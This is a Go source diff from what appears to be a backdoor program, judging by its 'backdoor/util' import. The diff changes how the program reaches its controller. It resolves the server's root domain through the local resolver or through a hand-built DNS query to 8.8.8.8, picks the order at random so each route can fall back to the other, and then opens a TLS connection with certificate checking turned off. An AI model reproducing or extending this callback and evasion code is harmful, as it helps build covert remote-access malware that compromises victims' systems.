@@ -3,13 +3,14 @@ package main
 import (
 	"backdoor/util"
 	"bufio"
-	"context"
 	"crypto/tls"
 	"fmt"
 	"math/rand"
 	"net"
 	"strings"
 	"time"
+
+	"golang.org/x/net/dns/dnsmessage"
 )
 
 func getDomain() (string, error) {
@@ -19,32 +20,68 @@ func getDomain() (string, error) {
 	return string(urlBytes), err
 }
 
-var CustomResolver = &net.Resolver{
-	PreferGo: true,
-	Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
-		d := &net.Dialer{}
-		return d.DialContext(ctx, network, "8.8.8.8:53")
-	},
-}
-
-var DefaultResolver = &net.Resolver{}
-
-func lookupIP(ctx context.Context, resolv *net.Resolver, host string) ([]net.IP, error) {
-	addrs, err := resolv.LookupIPAddr(ctx, host)
+func resolveDomainByLocal(domain string) []net.IP {
+	ips, err := net.LookupIP(domain)
 	if err != nil {
-		return nil, err
+		return nil
 	}
-	ips := make([]net.IP, 0)
-	for _, ia := range addrs {
-		if ia.IP == nil || ia.IP.To4() == nil {
+	var ipv4s []net.IP
+	for i := 0; i < len(ips); i++ {
+		if ips[i].To4() == nil {
 			continue
 		}
-		ips = append(ips, ia.IP)
+		ipv4s = append(ipv4s, ips[i])
 	}
-	if len(ips) == 0 {
-		return nil, fmt.Errorf("%d", len(ips))
+	return ipv4s
+}
+
+func resolveDomainByRemote(domain string, dnsServer string) []net.IP {
+	var msg dnsmessage.Message
+	msg.Header.ID = 1
+	msg.Header.RecursionDesired = true
+	msg.Questions = []dnsmessage.Question{
+		{
+			Name:  dnsmessage.MustNewName(domain + "."),
+			Type:  dnsmessage.TypeA,
+			Class: dnsmessage.ClassINET,
+		},
 	}
-	return ips, nil
+
+	packed, err := msg.Pack()
+	if err != nil {
+		return nil
+	}
+	conn, err := net.DialTimeout("udp", dnsServer, 8*time.Second)
+	if err != nil {
+		return nil
+	}
+	defer conn.Close()
+	if _, err := conn.Write(packed); err != nil {
+		return nil
+	}
+	buffer := make([]byte, 512)
+	conn.SetReadDeadline(time.Now().Add(8 * time.Second))
+	n, err := conn.Read(buffer)
+	if err != nil {
+		return nil
+	}
+	var response dnsmessage.Message
+	if err := response.Unpack(buffer[:n]); err != nil {
+		return nil
+	}
+	var ipv4s []net.IP
+	for _, ans := range response.Answers {
+		if ans.Header.Type != dnsmessage.TypeA {
+			continue
+		}
+		ares, ok := ans.Body.(*dnsmessage.AResource)
+		if !ok {
+			continue
+		}
+		ip := ares.A
+		ipv4s = append(ipv4s, net.IP(ip[:]))
+	}
+	return ipv4s
 }
 
 func getIP() string {
@@ -56,17 +93,25 @@ func getIP() string {
 	if index := strings.Index(realDomain, "."); index != -1 {
 		rootDomain = realDomain[index+1:]
 	}
-	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-	defer cancel()
-	ips, _ := lookupIP(ctx, CustomResolver, rootDomain)
-	if len(ips) == 0 {
-		ips, _ = lookupIP(ctx, DefaultResolver, rootDomain)
+	dnsserver := "8.8.8.8:53"
+	var ips []net.IP
+	if rand.Intn(2) == 0 {
+		ips = resolveDomainByLocal(rootDomain)
+		if len(ips) == 0 {
+			ips = resolveDomainByRemote(rootDomain, dnsserver)
+		}
+	} else {
+		ips = resolveDomainByRemote(rootDomain, dnsserver)
+		if len(ips) == 0 {
+			ips = resolveDomainByLocal(rootDomain)
+		}
 	}
+
 	if len(ips) == 0 {
 		return ""
 	}
 	conf := tls.Config{
-		ServerName: rootDomain,
+		ServerName:         rootDomain,
 		InsecureSkipVerify: true,
 	}
 	pdial := new(net.Dialer)
